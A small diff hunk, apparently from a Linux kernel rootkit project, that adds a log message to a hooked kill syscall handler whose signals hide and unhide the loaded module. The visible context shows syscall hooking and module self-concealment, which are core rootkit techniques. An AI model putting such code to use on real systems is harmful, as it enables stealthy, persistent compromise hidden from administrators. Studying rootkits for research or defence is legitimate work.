@@ -77,6 +77,7 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
             pr_info("Hiding the module!\n");
             hide();
         case SIG_UNHIDE:
+            pr_info("Unhiding the module!\n");
             unhide();
         default:
             return original_kill(pid, sig);
